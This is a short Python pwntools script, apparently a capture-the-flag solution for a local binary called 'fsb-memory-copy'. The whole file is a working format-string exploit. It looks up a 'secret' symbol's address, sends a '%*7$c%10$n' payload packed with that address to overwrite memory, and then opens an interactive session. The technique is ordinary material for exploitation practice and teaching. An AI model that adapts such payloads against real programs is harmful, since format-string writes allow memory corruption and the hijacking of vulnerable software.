#!/usr/bin/env python3
# Author: @TheFlash2k

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

exe = "./fsb-memory-copy"
elf = context.binary = ELF(exe)
secret = elf.sym.secret
info("secret @ %#x" % secret)

io = process()
if args.GDB: gdb.attach(io, "b *main+441")

payload = b"%*7$c%10$n||||||" + p64(secret)

io.sendline(payload)

io.interactive()
